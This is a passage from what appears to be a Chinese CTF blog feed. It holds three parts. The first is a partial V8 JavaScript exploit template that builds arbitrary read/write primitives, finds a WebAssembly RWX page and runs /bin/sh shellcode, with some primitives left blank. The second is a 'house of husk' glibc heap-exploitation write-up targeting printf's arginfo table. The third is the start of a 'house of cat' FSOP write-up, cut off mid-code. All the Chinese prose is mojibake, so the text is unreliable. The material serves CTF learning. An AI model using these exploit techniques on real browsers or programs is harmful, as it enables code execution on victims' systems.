class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><span class="hljs-keyword">var</span> f = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><span class="hljs-keyword">var</span> u32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><br><span class="hljs-comment">//32bitæ•´å‹å’Œ64bitæµ®ç‚¹ç±»å‹è½¬åŒ–</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">d2u</span>(<span class="hljs-params">v</span>) &#123;<br>  f64[<span class="hljs-number">0</span>] = v;<br>  <span class="hljs-keyword">return</span> u32;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">u2d</span>(<span class="hljs-params">lo, hi</span>) &#123;<br>  u32[<span class="hljs-number">0</span>] = lo;<br>  u32[<span class="hljs-number">1</span>] = hi;<br>  <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-comment">//64bitæ•´å‹å’Œ64bitæµ®ç‚¹ç±»å‹è½¬åŒ–</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  f64[<span class="hljs-number">0</span>] = f;<br>    <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    bigUint64[<span class="hljs-number">0</span>] = i;<br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObj</span>(<span class="hljs-params">addr_to_fake</span>)<br>&#123;<br>    ?<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj_to_leak</span>)<br>&#123;<br>    ?<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)<br>&#123;<br>    fake_array[<span class="hljs-number">1</span>] = <span class="hljs-title function_">itof</span>(addr - <span class="hljs-number">0x8n</span> + <span class="hljs-number">0x1n</span>);<br>    <span class="hljs-keyword">return</span> fake_object[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr, data</span>)<br>&#123;<br>    fake_array[<span class="hljs-number">1</span>] = <span class="hljs-title function_">itof</span>(addr - <span class="hljs-number">0x8n</span> + <span class="hljs-number">0x1n</span>);<br>    fake_object[<span class="hljs-number">0</span>] = <span class="hljs-title function_">itof</span>(data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode_to_rwx</span>(<span class="hljs-params">shellcode, rwx_addr</span>)<br>&#123;<br>  <span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(shellcode.<span class="hljs-property">length</span> * <span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_lo = <span class="hljs-title function_">addressOf</span>(data_buf) + <span class="hljs-number">0x18n</span>;<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_up = buf_backing_store_addr_lo + <span class="hljs-number">0x8n</span>;<br>  <span class="hljs-keyword">var</span> lov = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_lo))[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_lo = <span class="hljs-title function_">u2d</span>(lov, <span class="hljs-title function_">d2u</span>(rwx_addr)[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">var</span> hiv = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_up))[<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_hi = <span class="hljs-title function_">u2d</span>(<span class="hljs-title function_">d2u</span>(rwx_addr, hiv)[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr = <span class="hljs-title function_">ftoi</span>(<span class="hljs-title function_">u2d</span>(lov, hiv));<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] buf_backing_store_addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(buf_backing_store_addr));<br><br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_lo, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_lo));<br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_up, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_hi));<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-property">length</span>; ++i)<br>    data_view.<span class="hljs-title function_">setFloat64</span>(i * <span class="hljs-number">8</span>, <span class="hljs-title function_">itof</span>(shellcode[i]), <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">var</span> double_array = [<span class="hljs-number">1.1</span>];<br><span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-string">&quot;a&quot;</span> : <span class="hljs-number">1</span>&#125;;<br><span class="hljs-keyword">var</span> obj_array = [obj];<br><span class="hljs-keyword">var</span> array_map = ?;<br><span class="hljs-keyword">var</span> obj_map = ?;<br><br><span class="hljs-keyword">var</span> fake_array = [<br>  array_map,<br>  <span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)<br>];<br><br>fake_array_addr = <span class="hljs-title function_">addressOf</span>(fake_array);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak fake_array addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(fake_array_addr));<br>fake_object_addr = fake_array_addr - <span class="hljs-number">0x10n</span>;<br><span class="hljs-keyword">var</span> fake_object = <span class="hljs-title function_">fakeObj</span>(fake_object_addr);<br><span class="hljs-keyword">var</span> wasm_instance_addr = <span class="hljs-title function_">addressOf</span>(wasmInstance);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak wasm_instance addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(wasm_instance_addr));<br><span class="hljs-keyword">var</span> rwx_page_addr = <span class="hljs-title function_">read64</span>(wasm_instance_addr + <span class="hljs-number">0x68n</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(rwx_page_addr)));<br><br><span class="hljs-keyword">var</span> shellcode = [<br>  <span class="hljs-number">0x2fbb485299583b6an</span>,<br>  <span class="hljs-number">0x5368732f6e69622fn</span>,<br>  <span class="hljs-number">0x050f5e5457525f54n</span><br>];<br><br><span class="hljs-title function_">copy_shellcode_to_rwx</span>(shellcode, rwx_page_addr);<br><span class="hljs-title function_">f</span>();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of husk</title>
    <link href="/2023/03/03/house-of-husk/"/>
    <url>/2023/03/03/house-of-husk/</url>
    
    <content type="html"><![CDATA[<p>house of kiwi &amp; pig &amp; emma &amp; appleä¸æ‰“ç®—å†™äº†^(*ï¿£(oo)ï¿£)^ï¼Œæ„Ÿè§‰åˆ«çš„å¸ˆå‚…å·²ç»å†™çš„å¾ˆè¯¦ç»†äº†å†™ä¸å‡ºå•¥æ–°ä¸œè¥¿ï¼Œhuskæ„Ÿè§‰è¿˜å¯ä»¥ç›˜ä¸€ä¸‹æ‰€ä»¥å†™ä¸€ä¸‹</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>house of huskä¸»è¦æ˜¯åˆ©ç”¨äº†printfçš„ä¸€ä¸ªè°ƒç”¨é“¾<br>çœ‹åˆ«çš„å¸ˆå‚…çš„è®²è§£éƒ½æ˜¯ä»__register_printf_functionå‡½æ•°å¼€å§‹çš„ï¼Œä½†æœ¬æœºå®æµ‹å¹¶æ²¡æœ‰è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—ä»printfçš„æµç¨‹å¼€å§‹æ‹ä¸€é    </p><h2 id="printfæµç¨‹"><a href="#printfæµç¨‹" class="headerlink" title="printfæµç¨‹"></a>printfæµç¨‹</h2><p>è°ƒç”¨é“¾å¦‚ä¸‹ï¼š<br>printfè°ƒç”¨__vfprintf_internal</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.36\stdio-common\printf.c</span><br><br><span class="hljs-type">int</span><br>__printf (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)<br>&#123;<br>  va_list arg;<br>  <span class="hljs-type">int</span> done;<br><br>  va_start (arg, format);<br>  done = __vfprintf_internal (<span class="hljs-built_in">stdout</span>, format, arg, <span class="hljs-number">0</span>);<br>  va_end (arg);<br><br>  <span class="hljs-keyword">return</span> done;<br>&#125;<br></code></pre></td></tr></table></figure><p>__vfprintf_internalåœ¨æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æƒ…å†µä¸‹ä¼šè¿›å…¥åˆ¤æ–­ï¼Œæ»¡è¶³_printf_function_table !&#x3D; NULLä¼šè·³è‡³do_positionalæ‰§è¡Œprintf_positional</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.36\stdio-common\vfprintf-internal.c</span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">vfprintf</span> <span class="hljs-params">(FILE *s, <span class="hljs-type">const</span> CHAR_T *format, va_list ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mode_flags)</span><br>&#123;<br><br>â€¦â€¦<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="hljs-literal">NULL</span><br>|| __printf_modifier_table != <span class="hljs-literal">NULL</span><br>|| __printf_va_arg_table != <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">goto</span> do_positional;<br><br>â€¦â€¦<br><br>do_positional:<br>  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,<br>    done, nspecs_done, lead_str_end, work_buffer,<br>    save_errno, grouping, thousands_sep, mode_flags);<br><br> all_done:<br>  _IO_funlockfile (s);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">return</span> done;<br>&#125;<br></code></pre></td></tr></table></figure><p>printf_positionalè°ƒç”¨äº†__parse_one_specmb</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.36\stdio-common\vfprintf-internal.c</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">printf_positional</span> <span class="hljs-params">(FILE *s, <span class="hljs-type">const</span> CHAR_T *format, <span class="hljs-type">int</span> readonly_format,</span><br><span class="hljs-params">   va_list ap, va_list *ap_savep, <span class="hljs-type">int</span> done, <span class="hljs-type">int</span> nspecs_done,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> UCHAR_T *lead_str_end,</span><br><span class="hljs-params">   CHAR_T *work_buffer, <span class="hljs-type">int</span> save_errno,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *grouping, THOUSANDS_SEP_T thousands_sep,</span><br><span class="hljs-params">   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mode_flags)</span><br>&#123;<br><br>â€¦â€¦<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> COMPILE_WPRINTF</span><br>      nargs += __parse_one_specwc (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>â€¦â€¦<br></code></pre></td></tr></table></figure><p>è¿›å…¥__parse_one_specmbåå¦‚æœä¸æ»¡è¶³__printf_function_table &#x3D;&#x3D; NULLå¹¶ä¸”__printf_arginfo_table[spec-&gt;info.spec] &#x3D;&#x3D; NULLå°±ä¼šè°ƒç”¨__printf_arginfo_table[spec-&gt;info.spec]å‡½æ•°ï¼Œè§¦å‘åˆ©ç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span><br>attribute_hidden<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> COMPILE_WPRINTF</span><br>__parse_one_specwc (<span class="hljs-type">const</span> UCHAR_T *format, <span class="hljs-type">size_t</span> posn,<br>    <span class="hljs-keyword">struct</span> printf_spec *spec, <span class="hljs-type">size_t</span> *max_ref_arg)<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>__parse_one_specmb (<span class="hljs-type">const</span> UCHAR_T *format, <span class="hljs-type">size_t</span> posn,<br>    <span class="hljs-keyword">struct</span> printf_spec *spec, <span class="hljs-type">size_t</span> *max_ref_arg)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#123;<br><br>â€¦â€¦<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (__printf_function_table == <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>)<br>      || spec-&gt;info.spec &gt; UCHAR_MAX<br>      || __printf_arginfo_table[spec-&gt;info.spec] == <span class="hljs-literal">NULL</span><br>      || (<span class="hljs-type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])<br>   (&amp;spec-&gt;info, <span class="hljs-number">1</span>, &amp;spec-&gt;data_arg_type,<br>    &amp;spec-&gt;size)) &lt; <span class="hljs-number">0</span>)<br><br>â€¦â€¦<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨unsorted bin attackæˆ–large bin attackæ”¹å†™global_max_fastä¸ºä¸€ä¸ªå¤§å€¼ï¼Œè¿™æ ·æ‰€æœ‰é‡Šæ”¾çš„å †å—éƒ½ä¼šæ”¾è¿›fastbinä¸­ï¼Œæˆ‘ä»¬åªè¦è®¡ç®—å¥½main_arenaå’Œ__printf_arginfo_tableä»¥åŠ__printf_function_tableä¹‹é—´çš„åç§»ï¼Œé‡Šæ”¾ç›¸åº”å¤§å°çš„chunkï¼Œå¹¶ä¸”åœ¨__printf_arginfo_tableçš„chunkä¸­çš„__printf_arginfo_table[spec-&gt;info.spec]çš„ä½ç½®å†™å…¥one_gadget</p><img src="/2023/03/03/house-of-husk/distance.png" class title="distance">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>IO</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of cat</title>
    <link href="/2023/02/24/house-of-cat/"/>
    <url>/2023/02/24/house-of-cat/</url>
    
    <content type="html"><![CDATA[<p>ä¾‹é¢˜æ˜¯hgameçš„week4ï¼Œæ¯”èµ›çš„æ—¶å€™æ‘†çƒ‚äº†ï¼Œæ˜¨å¤©å­¦é•¿æäº†æ‰€ä»¥è¡¥ä¸€ä¸‹</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><h2 id="é«˜ç‰ˆæœ¬å˜åŒ–"><a href="#é«˜ç‰ˆæœ¬å˜åŒ–" class="headerlink" title="é«˜ç‰ˆæœ¬å˜åŒ–"></a>é«˜ç‰ˆæœ¬å˜åŒ–</h2><h3 id="å…³äº-IO-flush-all-lockp"><a href="#å…³äº-IO-flush-all-lockp" class="headerlink" title="å…³äº_IO_flush_all_lockp"></a>å…³äº_IO_flush_all_lockp</h3><p>è§¦å‘FSOPçš„é€”å¾„æœ‰ä¸‰ä¸ªï¼š</p><ul><li>ç¨‹åºæ‰§è¡Œexit</li><li>ç¨‹åºä»mainå‡½æ•°æ­£å¸¸è¿”å›</li><li>è§¦å‘malloc_printerr</li></ul><p>ä½†æ˜¯ä»2.27å¼€å§‹ï¼Œabortå‡½æ•°ä¸å†æ‰§è¡Œfflushï¼Œç¬¬ä¸‰ç§åˆ©ç”¨æ–¹å¼å°±ä¸æˆç«‹äº†</p><img src="/2023/02/24/house-of-cat/difference.png" class title="difference"><p>ä½†è¿˜æœ‰ä¸€ä¸ªassertå¯ä»¥åˆ©ç”¨<br>assertçš„å®å®šä¹‰å¦‚ä¸‹ï¼Œå¯è§å¦‚æœassertçš„è¡¨è¾¾å¼ä¸ºå‡ä¼šæ‰§è¡Œ__assert_fail</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.37\assert\assert.h</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined __cplusplus</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> assert(expr)\</span><br><span class="hljs-meta">     (static_cast <span class="hljs-string">&lt;bool&gt;</span> (expr)\</span><br><span class="hljs-meta">      ? void (0)\</span><br><span class="hljs-meta">      : __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION))</span><br><span class="hljs-meta"># <span class="hljs-keyword">elif</span> !defined __GNUC__ || defined __STRICT_ANSI__</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> assert(expr)\</span><br><span class="hljs-meta">    ((expr)\</span><br><span class="hljs-meta">     ? __ASSERT_VOID_CAST (0)\</span><br><span class="hljs-meta">     : __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION))</span><br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> assert(expr)\</span><br><span class="hljs-meta">  ((void) sizeof ((expr) ? 1 : 0), __extension__ (&#123;\</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (expr)\</span><br><span class="hljs-meta">        ; <span class="hljs-comment">/* empty */</span>\</span><br><span class="hljs-meta">      <span class="hljs-keyword">else</span>\</span><br><span class="hljs-meta">        __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION);\</span><br><span class="hljs-meta">    &#125;))</span><br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>malloc.cä¸­æœ‰ä¸€ä¸ª__assert_failå‡½æ•°ï¼ˆ2.36ä¸­åˆ é™¤äº†fflushï¼Œ2.37åˆ é™¤äº†__malloc_assertå‡½æ•°ï¼‰ï¼š</p><ul><li>2.35<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> __assert_fail(assertion, file, <span class="hljs-keyword">line</span>, function)\</span><br><span class="hljs-meta"> __malloc_assert(assertion, file, <span class="hljs-keyword">line</span>, function)</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__progname;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>     __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>     file, line,<br>     function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>     assertion);<br>  fflush (<span class="hljs-built_in">stderr</span>);<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li>2.36ç”¨__libc_messageæ›¿æ¢äº†__fxprintfï¼Œä¸”ç”¨__builtin_unreachableæ›¿æ¢äº†fflushå’Œabortï¼Œæ²¡æœ‰fflush assertçš„åˆ©ç”¨åœ¨2.36æ— æ³•æ‰§è¡Œ<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> __assert_fail(assertion, file, <span class="hljs-keyword">line</span>, function)\</span><br><span class="hljs-meta"> __malloc_assert(assertion, file, <span class="hljs-keyword">line</span>, function)</span><br><br><span class="hljs-keyword">_Noreturn</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  __libc_message (do_abort, <span class="hljs-string">&quot;\</span><br><span class="hljs-string">Fatal glibc error: malloc assertion failure in %s: %s\n&quot;</span>,<br>  function, assertion);<br>  __builtin_unreachable ();<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li>2.37è™½ç„¶malloc.cä¸­æ²¡æœ‰äº†__assert_failå‡½æ•°ï¼Œä½†assert.cä¸­æœ‰__assert_failå‡½æ•°ï¼Œä¸”ä¹Ÿè°ƒç”¨äº†fflush<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__assert_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  __assert_fail_base (_(<span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n%n&quot;</span>),<br>      assertion, file, line, function);<br>&#125;<br><br><span class="hljs-type">void</span><br>__assert_fail_base (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file,<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  <span class="hljs-type">char</span> *str;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> FATAL_PREPARE</span><br>  FATAL_PREPARE;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-type">int</span> total;<br>  <span class="hljs-keyword">if</span> (__asprintf (&amp;str, fmt,<br>  __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>  file, line,<br>  function ? 